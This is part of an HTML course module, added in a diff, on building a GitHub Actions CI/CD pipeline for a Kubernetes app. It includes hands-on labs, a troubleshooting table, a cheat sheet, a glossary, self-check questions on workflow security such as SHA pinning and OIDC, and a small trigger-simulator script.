+        <defs><marker id="m9o" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" style="color:var(--d-stroke)"/></marker></defs>
+        <rect x="10" y="60" width="180" height="80" rx="8" class="box2"/><text x="100" y="86" text-anchor="middle" class="t-bold">deploy job</text><text x="100" y="106" text-anchor="middle" class="t-mono">id-token: write</text><text x="100" y="124" text-anchor="middle" class="t-muted">environment: staging</text>
+        <rect x="320" y="10" width="220" height="60" rx="8" class="box3"/><text x="430" y="36" text-anchor="middle" class="t-bold">GitHub OIDC provider</text><text x="430" y="56" text-anchor="middle" class="t-muted">signs JWT per job</text>
+        <rect x="320" y="140" width="220" height="70" rx="8" class="box4"/><text x="430" y="164" text-anchor="middle" class="t-bold">Google Cloud WIF</text><text x="430" y="184" text-anchor="middle" class="t-muted">checks iss, aud, sub claims</text><text x="430" y="200" text-anchor="middle" class="t-muted">vs. trust policy</text>
+        <rect x="670" y="140" width="180" height="70" rx="8" class="box"/><text x="760" y="166" text-anchor="middle" class="t-bold">GKE / Artifact</text><text x="760" y="184" text-anchor="middle" class="t-bold">Registry APIs</text>
+        <path d="M190 80 C250 60 260 40 316 40" class="line" marker-end="url(#m9o)"/><text x="200" y="40" class="t-muted">1 request JWT</text>
+        <path d="M430 70 C430 100 260 100 194 104" class="line accent" marker-end="url(#m9o)"/><text x="240" y="92" class="t-muted">2 JWT (sub = repo:…:environment:staging)</text>
+        <path d="M190 128 C250 160 270 175 316 175" class="line" marker-end="url(#m9o)"/><text x="196" y="186" class="t-muted">3 exchange</text>
+        <path d="M540 175 H666" class="line ok" marker-end="url(#m9o)"/><text x="560" y="166" class="t-muted">4 short-lived token</text>
+      </svg>
+      <figcaption>The <code>sub</code> claim encodes where the job came from, e.g. <code>repo:octo-org/octo-repo:ref:refs/heads/main</code> or <code>repo:octo-org/octo-repo:environment:prod</code>. The cloud trust policy should match it narrowly. Setup for GCP: Module 11.</figcaption>
+    </figure>
+
+    <!-- ============================================================ -->
+    <h2>Labs</h2>
+    <section class="lab"><header>Lab 1 — Your first green pipeline</header><div class="body">
+      <p>Goal: push <code>kubernetes-reliability-lab/</code> with <code>ci.yml</code> and watch the first run end to end. Requires the GitHub CLI (<code>gh auth login</code> done) and the files listed above.</p>
+      <ol class="steps">
+        <li>Run the tests locally first (CI should never be the first place tests run):
+<pre><code>cd kubernetes-reliability-lab
+python3.12 -m venv .venv &amp;&amp; source .venv/bin/activate
+python -m pip install -r requirements.txt -r requirements-dev.txt
+ruff check app &amp;&amp; python -m pytest -q app/tests</code></pre>
+<pre class="o" data-title="Example output (yours will differ in timings)"><code>....                                                                     [100%]
+4 passed in 0.41s</code></pre></li>
+        <li>Pin actions: for each <code>uses:</code> line, resolve the SHA (<code>git ls-remote --tags …</code>) and replace <code>@vN</code> with <code>@&lt;sha&gt; # vN.x.y</code>.</li>
+        <li>Commit and push to a new GitHub repository:
+<pre><code>git add . &amp;&amp; git commit -m "ci: add test/build/scan/kind pipeline"
+gh repo create kubernetes-reliability-lab --private --source . --push
+gh run list --workflow ci.yml --limit 3
+gh run watch            # pick the run; streams job status until it ends</code></pre>
+<pre class="o" data-title="Example output (yours will differ in IDs/timings)"><code>STATUS  TITLE                                   WORKFLOW  BRANCH  EVENT  ID          ELAPSED
+*       ci: add test/build/scan/kind pipeline   ci        main    push   1234567890  1m12s
+…
+✓ main ci · 1234567890
+Triggered via push about 6 minutes ago
+
+JOBS
+✓ test (py3.12) in 41s
+✓ test (py3.13) in 44s
+✓ build in 1m31s
+✓ scan in 52s
+✓ kind-integration in 2m58s
+✓ publish in 22s</code></pre></li>
+        <li>Open the run summary page: confirm the "ready in kind" line and the published image reference. Then verify the image exists:
+<pre><code>docker pull ghcr.io/&lt;you&gt;/reliability-api:$(git rev-parse HEAD)</code></pre></li>
+        <li>Rerun the workflow without changes (<code>gh run rerun &lt;id&gt;</code>) and compare the <code>build</code> job duration: the second build should hit the layer cache (look for <code>CACHED</code> lines in the build log).</li>
+      </ol>
+      <p><strong>Evidence to keep:</strong> run URL, job durations cold vs warm, the image reference.</p>
+    </div></section>
+
+    <section class="lab"><header>Lab 2 — Break it on purpose: fail-fast, skipped jobs, diagnostics</header><div class="body">
+      <ol class="steps">
+        <li>Create a branch and introduce a regression a unit test will catch — e.g. change <code>/health</code> to return <code>{"status": "OK"}</code>. Open a PR:
+<pre><code>git switch -c break-health
+sed -i.bak 's/"status": "ok"/"status": "OK"/' app/main.py &amp;&amp; rm app/main.py.bak
+git commit -am "break: health payload" &amp;&amp; git push -u origin break-health
+gh pr create --fill --base main</code></pre></li>
+        <li>Watch the PR checks: <code>gh pr checks --watch</code>. Expect one red <code>test</code> leg, the other cancelled (fail-fast), and build/scan/kind-integration skipped. <code>publish</code> is skipped because of its <code>if:</code> (event is pull_request).</li>
+        <li>Read only what failed:
+<pre><code>gh run view --log-failed</code></pre>
+<pre class="o" data-title="Example output (abridged; yours will differ)"><code>test (py3.13)  Unit tests  FAILED app/tests/test_main.py::test_health - AssertionError: assert {'status': 'OK'} == {'status': 'ok'}
+test (py3.13)  Unit tests  1 failed, 3 passed in 0.52s
+test (py3.13)  Unit tests  ##[error]Process completed with exit code 1.</code></pre></li>
+        <li>Now break the <em>deployment</em> instead: revert the code, and in <code>deploy/kubernetes/deployment.yaml</code> change the readiness probe path to <code>/readyz</code>. Push. Expect test/build/scan green and <code>kind-integration</code> red at <code>rollout status</code>. Download the diagnostics: <code>gh run download &lt;id&gt; -n kind-logs</code>, and find "Readiness probe failed: HTTP probe failed with statuscode: 404" in the describe output.</li>
+        <li>Fix, push, and confirm the PR goes green. Close the PR or merge it.</li>
+      </ol>
+      <p><strong>What you learned:</strong> which stage catches which class of bug — the core argument for ordering stages by cost.</p>
+    </div></section>
+
+    <section class="lab"><header>Lab 3 — Reproduce the kind job locally</header><div class="body">
+      <p>When the CI integration job fails, reproduce it with the same commands on your laptop (Module 06 setup).</p>
+      <ol class="steps">
+        <li>
+<pre><code>export IMAGE=reliability-api:ci-local
+docker build -t "$IMAGE" .
+kind create cluster --name reliability-lab --wait 120s
+kind load docker-image "$IMAGE" --name reliability-lab
+kubectl apply -f deploy/kubernetes/namespace.yaml
+kubectl apply -f deploy/kubernetes/
+kubectl -n reliability-lab set image deployment/reliability-api reliability-api="$IMAGE"
+kubectl -n reliability-lab rollout status deployment/reliability-api --timeout=180s
+kubectl -n reliability-lab port-forward svc/reliability-api 8080:80 &amp;
+curl -fsS --retry 15 --retry-connrefused --retry-delay 2 http://localhost:8080/ready</code></pre>
+<pre class="o" data-title="Example output (yours will differ)"><code>deployment "reliability-api" successfully rolled out
+{"ready":true}</code></pre></li>
+        <li>Clean up: <code>kill %1; kind delete cluster --name reliability-lab</code> (or keep it if it's your daily lab cluster — then skip the create step next time).</li>
+      </ol>
+      <div class="callout tip"><span class="label">Keep CI logic in scripts</span>If the "Deploy" and "Probe" steps grow, move them into <code>scripts/ci-kind-test.sh</code> and call it from the workflow. Then local reproduction is literally the same script.</div>
+    </div></section>
+
+    <section class="lab"><header>Lab 4 — Make CI binding: required checks and a gated environment</header><div class="body">
+      <ol class="steps">
+        <li>Repository → Settings → Branches (or Rules → Rulesets) → add a rule for <code>main</code>: require a PR, require status checks <code>test (py3.12)</code>, <code>test (py3.13)</code>, <code>build</code>, <code>scan</code>, <code>kind-integration</code>; require branches to be up to date.</li>
+        <li>Re-open the broken PR from Lab 2: the merge button is now blocked while checks are red.</li>
+        <li>Settings → Environments → New environment <code>staging</code> → add yourself as required reviewer, restrict deployment branches to <code>main</code>.</li>
+        <li>Add the <code>deploy-gke</code> preview job (echo only) to <code>ci.yml</code>, push to main, and observe the run pausing with "Waiting for review". Approve it and watch it continue.</li>
+        <li>Set the repo default token permission to read-only (Settings → Actions → General → Workflow permissions) — the workflow still works because <code>publish</code> requests <code>packages: write</code> explicitly.</li>
+      </ol>
+    </div></section>
+
+    <!-- ============================================================ -->
+    <h2>Troubleshooting a red pipeline</h2>
+    <div class="table-wrap"><table>
+      <tr><th>Symptom</th><th>Likely cause</th><th>First check / fix</th></tr>
+      <tr><td>Workflow doesn't run at all</td><td><code>on:</code> filters don't match (feature-branch push; PR to non-main base); YAML syntax error; file not in <code>.github/workflows/</code></td><td>Actions tab shows a YAML error banner; compare event/branch with <code>on:</code> (use the simulator)</td></tr>
+      <tr><td>"Run workflow" button missing</td><td><code>workflow_dispatch</code> file not on default branch</td><td>Merge the workflow to main first</td></tr>
+      <tr><td>PR stuck "Expected — waiting for status"</td><td>required check name changed, or workflow skipped by path/branch filter</td><td>Update protection rule; replace path filters with job-level <code>if:</code></td></tr>
+      <tr><td>Job "skipped"</td><td>a needed job failed/skipped, or <code>if:</code> false</td><td>Look upstream in the graph; print <code>toJSON(needs)</code> in a debug step</td></tr>
+      <tr><td><code>Resource not accessible by integration</code> / 403</td><td>token lacks a scope; listing one scope set others to none</td><td>Add the scope at job level; remember <code>contents: read</code></td></tr>
+      <tr><td><code>denied</code> on <code>docker push</code> to ghcr.io</td><td>missing <code>packages: write</code>; package not linked to repo; uppercase in name</td><td>Job permissions; package settings → Manage Actions access; use metadata-action output</td></tr>
+      <tr><td>Fork PR fails at login step</td><td>secrets not passed to forks; read-only token</td><td>Never push from PR runs (our <code>if:</code> handles it)</td></tr>
+      <tr><td>Cache never hits</td><td>key includes a value that changes every run; 7-day eviction; different branch scope</td><td>Print the key; key on <code>hashFiles</code> of lock files only</td></tr>
+      <tr><td><code>rollout status</code> timeout in kind</td><td>readiness failing, image tag mismatch, CrashLoop, Pending</td><td>Diagnostics group "describe pods" + events; reproduce with Lab 3</td></tr>
+      <tr><td>Trivy job red</td><td>fixable HIGH/CRITICAL CVE</td><td>Bump base image / dependency; document justified ignores</td></tr>
+      <tr><td>Step passes but shouldn't</td><td><code>continue-on-error</code>, <code>|| true</code>, or scanner <code>exit-code</code> 0</td><td>Grep the workflow for failure-swallowing constructs</td></tr>
+    </table></div>
+
+    <!-- ============================================================ -->
+    <h2>Cheat sheet</h2>
+    <div class="table-wrap"><table>
+      <tr><th>Task</th><th>Syntax / command</th></tr>
+      <tr><td>Trigger on PRs to main + pushes to main + manual</td><td><code>on: { push: { branches: [main] }, pull_request: { branches: [main] }, workflow_dispatch: {} }</code></td></tr>
+      <tr><td>Read-only token default</td><td><code>permissions: { contents: read }</code></td></tr>
+      <tr><td>Job dependency</td><td><code>needs: [build, scan]</code></td></tr>
+      <tr><td>Run only on main push</td><td><code>if: github.event_name == 'push' &amp;&amp; github.ref == 'refs/heads/main'</code></td></tr>
+      <tr><td>Always-run-unless-cancelled step</td><td><code>if: ${{ !cancelled() }}</code></td></tr>
+      <tr><td>Diagnostics only on failure</td><td><code>if: ${{ failure() }}</code></td></tr>
+      <tr><td>Step output</td><td><code>echo "k=v" &gt;&gt; "$GITHUB_OUTPUT"</code> → <code>steps.&lt;id&gt;.outputs.k</code></td></tr>
+      <tr><td>Job output</td><td><code>outputs: { k: ${{ steps.id.outputs.k }} }</code> → <code>needs.&lt;job&gt;.outputs.k</code></td></tr>
+      <tr><td>Export env to later steps</td><td><code>echo "K=v" &gt;&gt; "$GITHUB_ENV"</code></td></tr>
+      <tr><td>Run summary</td><td><code>echo "### text" &gt;&gt; "$GITHUB_STEP_SUMMARY"</code></td></tr>
+      <tr><td>Matrix</td><td><code>strategy: { matrix: { python-version: ['3.12','3.13'] } }</code></td></tr>
+      <tr><td>pip cache</td><td><code>actions/setup-python</code> with <code>cache: pip</code></td></tr>
+      <tr><td>Docker layer cache</td><td><code>cache-from: type=gha</code>, <code>cache-to: type=gha,mode=max</code></td></tr>
+      <tr><td>Full-SHA image tag</td><td>metadata-action <code>tags: type=sha,format=long,prefix=</code></td></tr>
+      <tr><td>GHCR login</td><td>login-action: <code>registry: ghcr.io</code>, <code>username: ${{ github.actor }}</code>, <code>password: ${{ secrets.GITHUB_TOKEN }}</code></td></tr>
+      <tr><td>Pin an action</td><td><code>uses: owner/repo@&lt;40-hex-sha&gt; # vX.Y.Z</code></td></tr>
+      <tr><td>List / watch runs</td><td><code>gh run list</code>, <code>gh run watch</code>, <code>gh pr checks --watch</code></td></tr>
+      <tr><td>Failed logs only</td><td><code>gh run view &lt;id&gt; --log-failed</code></td></tr>
+      <tr><td>Download artifact</td><td><code>gh run download &lt;id&gt; -n kind-logs</code></td></tr>
+      <tr><td>Manual trigger</td><td><code>gh workflow run ci.yml --ref main</code></td></tr>
+      <tr><td>Set a secret</td><td><code>gh secret set NAME</code> (<code>--env staging</code> for an environment)</td></tr>
+    </table></div>
+
+    <h2>Glossary</h2>
+    <dl class="defs">
+      <dt>CI</dt><dd>Continuous integration: frequent merges, each automatically built and tested.</dd>
+      <dt>Continuous delivery</dt><dd>Every passing change produces a deployable artifact; deploy is a human decision.</dd>
+      <dt>Continuous deployment</dt><dd>Every passing change is deployed automatically.</dd>
+      <dt>Workflow / run</dt><dd>YAML automation definition / one execution of it for one event.</dd>
+      <dt>Job / step</dt><dd>Unit scheduled on one runner / one command or action within a job.</dd>
+      <dt>Action</dt><dd>Reusable packaged step referenced by <code>owner/repo@ref</code>.</dd>
+      <dt>Runner</dt><dd>Machine that executes a job; GitHub-hosted runners are fresh VMs.</dd>
+      <dt>needs graph</dt><dd>DAG of job dependencies; failed upstream → downstream skipped.</dd>
+      <dt>Context / expression</dt><dd>Objects like <code>github</code>, <code>needs</code> / <code>${{ }}</code> evaluated by GitHub.</dd>
+      <dt>GITHUB_TOKEN</dt><dd>Per-job, repo-scoped installation token; scopes set by <code>permissions:</code>.</dd>
+      <dt>Least privilege</dt><dd>Grant only the scopes a job needs, for as short as possible.</dd>
+      <dt>SHA pinning</dt><dd>Referencing an action by full commit SHA so its code can't change under you.</dd>
+      <dt>Cache vs artifact</dt><dd>Best-effort speed-up across runs vs guaranteed run-scoped file hand-off.</dd>
+      <dt>GHCR</dt><dd>GitHub Container Registry, <code>ghcr.io</code>.</dd>
+      <dt>Required status check</dt><dd>A check that must succeed (or be skipped/neutral) before merging to a protected branch.</dd>
+      <dt>Environment</dt><dd>Named deployment target with protection rules and its own secrets.</dd>
+      <dt>OIDC</dt><dd>Short-lived identity token per job, exchanged for cloud credentials without stored keys.</dd>
+      <dt>Fail-fast</dt><dd>Stop sibling matrix legs (and, via needs, downstream jobs) on the first failure.</dd>
+    </dl>
+
+    <h2>Self-check</h2>
+    <details class="q"><summary>1. Why does the pipeline upload the image as an artifact instead of letting each job rebuild it?</summary><div class="a">Jobs run on different VMs and share nothing. Rebuilding in each job would mean the scanned/tested image may differ from the published one (base image updated between builds, non-reproducible layers). The artifact guarantees build-once, test-and-ship the same bytes.</div></details>
+    <details class="q"><summary>2. A teammate adds <code>permissions: { packages: write }</code> at workflow level and now <code>actions/checkout</code> fails. Why?</summary><div class="a">When any scope is specified, all unspecified scopes become <code>none</code> — including <code>contents</code>, which checkout needs. Also, write access to packages should be granted only in the publish job, not workflow-wide.</div></details>
+    <details class="q"><summary>3. What does <code>fail-fast: true</code> do, and when would you turn it off?</summary><div class="a">If any matrix leg fails, GitHub cancels the in-progress and queued legs of that matrix. Turn it off when you need the full compatibility picture (e.g. to see which Python versions fail).</div></details>
+    <details class="q"><summary>4. Why is <code>uses: aquasecurity/trivy-action@0.x</code> riskier than a SHA, even though the tag looks like a fixed version?</summary><div class="a">Git tags can be moved. In March 2026 attackers force-pushed 76 of 77 trivy-action tags to malicious commits; tag-pinned workflows ran the malware. A full commit SHA cannot be re-pointed without a SHA-1 collision.</div></details>
+    <details class="q"><summary>5. A fork contributor opens a PR. Which of our jobs run, and can any of them leak secrets?</summary><div class="a">test, build, scan and kind-integration run with a read-only token and no repository secrets (secrets other than GITHUB_TOKEN aren't passed to fork runs). publish is skipped by its <code>if:</code>. Nothing writes to GHCR; there are no custom secrets to leak.</div></details>
+    <details class="q"><summary>6. You added <code>paths-ignore: ['docs/**']</code> and now docs-only PRs can't be merged. Explain.</summary><div class="a">The workflow is skipped entirely for those PRs, so its required checks stay "Pending" forever. Remove the path filter and skip expensive jobs with an <code>if:</code> instead — a job skipped by a conditional reports success.</div></details>
+    <details class="q"><summary>7. Cache vs artifact: where do pip downloads, JUnit XML and the image tarball belong?</summary><div class="a">pip downloads → cache (speed only, may vanish). JUnit XML → artifact (evidence for this run). Image tarball → artifact (guaranteed hand-off within the run); the published image → registry.</div></details>
+    <details class="q"><summary>8. Why does the kind job use a SHA tag instead of <code>:latest</code> for the side-loaded image?</summary><div class="a">With <code>:latest</code> the default <code>imagePullPolicy</code> is <code>Always</code>, so the kubelet tries to pull from a registry and ignores the side-loaded image (<code>ErrImagePull</code>). A specific tag defaults to <code>IfNotPresent</code>. The SHA tag also ties the test to one commit.</div></details>
+    <details class="q"><summary>9. What is the difference between continuous delivery and continuous deployment in our project's terms?</summary><div class="a">Delivery: a green main commit publishes <code>ghcr.io/&lt;you&gt;/reliability-api:&lt;sha&gt;</code>; deploying it to GKE waits for a reviewer on the <code>staging</code> environment. Deployment would roll it out automatically with no approval.</div></details>
+    <details class="q"><summary>10. What does OIDC remove from the repository, and what must the cloud trust policy check?</summary><div class="a">It removes long-lived cloud keys stored as secrets. The trust policy should check the token issuer/audience and a narrow <code>sub</code> claim (e.g. this repo and environment <code>staging</code> or ref <code>refs/heads/main</code>), so other repos/branches can't assume the identity.</div></details>
+    <details class="q"><summary>11. Why does <code>if: always()</code> on a long diagnostics step carry a risk that <code>!cancelled()</code> doesn't?</summary><div class="a"><code>always()</code> runs even when the run is being cancelled, so a hanging step can delay cancellation until timeout; GitHub recommends <code>!cancelled()</code> for steps that could fail critically or hang.</div></details>
+
+    <h2>Sources</h2>
+    <ul class="sources">
+      <li><a href="https://docs.github.com/en/actions/get-started/understand-github-actions">Understanding GitHub Actions — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax">Workflow syntax for GitHub Actions — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows">Events that trigger workflows — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/actions/reference/workflows-and-actions/contexts">Contexts reference — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/actions/reference/workflows-and-actions/expressions">Expressions — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands">Workflow commands (GITHUB_OUTPUT, GITHUB_ENV, summaries, masking) — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/pass-job-outputs">Passing information between jobs — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets">Using secrets in GitHub Actions — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-variables">Store information in variables — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/actions/concepts/security/github_token">GITHUB_TOKEN — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/actions/reference/security/secure-use">Secure use reference (security hardening, SHA pinning, script injection) — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching">Dependency caching reference — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/actions/concepts/runners/github-hosted-runners">GitHub-hosted runners — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/packages/managing-github-packages-using-github-actions-workflows/publishing-and-installing-a-package-with-github-actions">Publishing and installing a package with GitHub Actions — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments">Deployments and environments — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches">About protected branches — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/pull-requests/how-tos/merge-and-close-pull-requests/troubleshooting-required-status-checks">Troubleshooting required status checks — docs.github.com</a></li>
+      <li><a href="https://docs.github.com/en/actions/concepts/security/openid-connect">OpenID Connect — docs.github.com</a></li>
+      <li><a href="https://github.com/actions/checkout">actions/checkout README (v7, fetch-depth, persist-credentials)</a></li>
+      <li><a href="https://github.com/actions/setup-python">actions/setup-python README (v7, cache: pip)</a></li>
+      <li><a href="https://github.com/actions/cache">actions/cache README (v6, key/restore-keys/cache-hit)</a></li>
+      <li><a href="https://github.com/actions/upload-artifact">actions/upload-artifact README (v7)</a> · <a href="https://github.com/actions/download-artifact">actions/download-artifact README (v8)</a></li>
+      <li><a href="https://github.com/docker/build-push-action">docker/build-push-action README (v7)</a> · <a href="https://github.com/docker/metadata-action">docker/metadata-action README (v6, type=sha)</a> · <a href="https://github.com/docker/login-action">docker/login-action README (v4, GHCR)</a></li>
+      <li><a href="https://docs.docker.com/build/ci/github-actions/cache/">Cache management with GitHub Actions — docs.docker.com</a></li>
+      <li><a href="https://github.com/aquasecurity/trivy-action">aquasecurity/trivy-action README (inputs, defaults)</a> · <a href="https://github.com/advisories/GHSA-69fq-xp46-6x23">GHSA-69fq-xp46-6x23 / CVE-2026-33634 — Trivy ecosystem supply chain compromise (GitHub Advisory Database)</a></li>
+      <li><a href="https://github.com/helm/kind-action">helm/kind-action README (inputs, defaults)</a></li>
+      <li><a href="https://kind.sigs.k8s.io/docs/user/quick-start/">kind Quick Start (create/load/export logs, imagePullPolicy note) — kind.sigs.k8s.io</a></li>
+    </ul>
+
+    <nav class="pager">
+      <a class="prev" href="08-scaling-load-failure.html"><small>◀ Previous</small>Module 08 · Autoscaling, Load Testing &amp; Failure Testing</a>
+      <a class="next" href="10-terraform.html"><small>Next ▶</small>Module 10 · Terraform &amp; Infrastructure as Code</a>
+    </nav>
+  </article></main>
+</div>
+<script>
+(function () {
+  var ev = document.getElementById("ts-event"), br = document.getElementById("ts-branch"),
+      fork = document.getElementById("ts-fork"), fail = document.getElementById("ts-fail"),
+      table = document.getElementById("ts-table"), out = document.getElementById("ts-out");
+  if (!ev) return;
+  var JOBS = ["test (py3.12)", "test (py3.13)", "build", "scan", "kind-integration", "publish"];
+  function row(job, cls, label, why) {
+    return "<tr><td><code>" + job + "</code></td><td class=\"" + cls + "\">" + label + "</td><td>" + why + "</td></tr>";
+  }
+  function render() {
+    var e = ev.value, b = br.value, isFork = fork.checked && e === "pull_request", broken = fail.checked;
+    fork.disabled = e !== "pull_request";
+    var lines = [], triggered = false, why = "";
+    if (e === "push") { triggered = b === "main"; why = triggered ? "on.push.branches includes main" : "on.push.branches is [main]; pushes to " + b + " are tested via their PR"; }
+    else if (e === "pull_request") { triggered = b === "main"; why = triggered ? "on.pull_request.branches includes the base branch main" : "base branch " + b + " is not in on.pull_request.branches"; }
+    else if (e === "workflow_dispatch") { triggered = true; why = "workflow_dispatch has no branch filter (file must exist on the default branch)"; }
+    else { triggered = false; why = "ci.yml declares no schedule trigger"; }
+    var ref = e === "pull_request" ? "refs/pull/<n>/merge" : "refs/heads/" + b;
+    lines.push("github.event_name = '" + e + "'");
+    lines.push("github.ref        = '" + ref + "'");
+    if (e === "pull_request") lines.push("GITHUB_SHA        = merge commit of PR head into " + b);
+    else if (e === "push") lines.push("GITHUB_SHA        = tip commit pushed to " + b);
+    else lines.push("GITHUB_SHA        = last commit on " + (e === "schedule" ? "default branch" : b));
+    var html = "<tr><th>Job</th><th>Result</th><th>Reason</th></tr>";
+    if (!triggered) {
+      JOBS.forEach(function (j) { html += row(j, "st-none", "no run", "workflow not triggered"); });
+      lines.push(""); lines.push("No workflow run: " + why + ".");
+      if (e === "pull_request") lines.push("If this check were required on " + b + ", the PR would show it as Pending/expected.");
+      table.innerHTML = html; out.textContent = lines.join("\n"); return;
+    }
+    lines.push(""); lines.push("Run created: " + why + ".");
+    if (broken) {
+      html += row(JOBS[0], "st-skip", "cancelled", "fail-fast: sibling leg py3.13 failed");
+      html += row(JOBS[1], "st-fail", "failure", "pytest exited 1");
+      ["build", "scan", "kind-integration"].forEach(function (j) { html += row(j, "st-skip", "skipped", "a job in its needs chain failed"); });
+    } else {
+      html += row(JOBS[0], "st-run", "runs", "no needs; matrix leg");
+      html += row(JOBS[1], "st-run", "runs", "no needs; matrix leg");
+      html += row("build", "st-run", "runs", "needs test: all legs succeeded");
+      html += row("scan", "st-run", "runs", "needs build: succeeded");
+      html += row("kind-integration", "st-run", "runs", "needs build, scan: succeeded");
+    }
+    var pubIf = e === "push" && ref === "refs/heads/main";
+    if (broken) html += row("publish", "st-skip", "skipped", "needs chain failed (and if: " + (pubIf ? "true" : "false") + ")");
+    else if (pubIf) html += row("publish", "st-run", "runs", "if: push && refs/heads/main is true; gets packages: write");
+    else html += row("publish", "st-skip", "skipped", "if: event_name == 'push' && ref == 'refs/heads/main' is false; reports success to checks");
+    if (isFork) lines.push("Fork PR: GITHUB_TOKEN is read-only and no repository secrets are passed. Nothing in test..kind needs secrets, so the run works.");
+    if (e === "pull_request") lines.push("concurrency: a newer push to this PR cancels this run (cancel-in-progress is true for pull_request).");
+    if (e === "push" && b === "main") lines.push("concurrency: main runs are queued, not cancelled, so every main commit can publish.");
+    if (!broken && pubIf) lines.push("Result: image ghcr.io/<you>/reliability-api:<full sha> is pushed.");
+    table.innerHTML = html; out.textContent = lines.join("\n");
+  }
+  [ev, br, fork, fail].forEach(function (el) { el.addEventListener("change", render); });
+  render();
+})();
+</script>
+</body>
+</html>
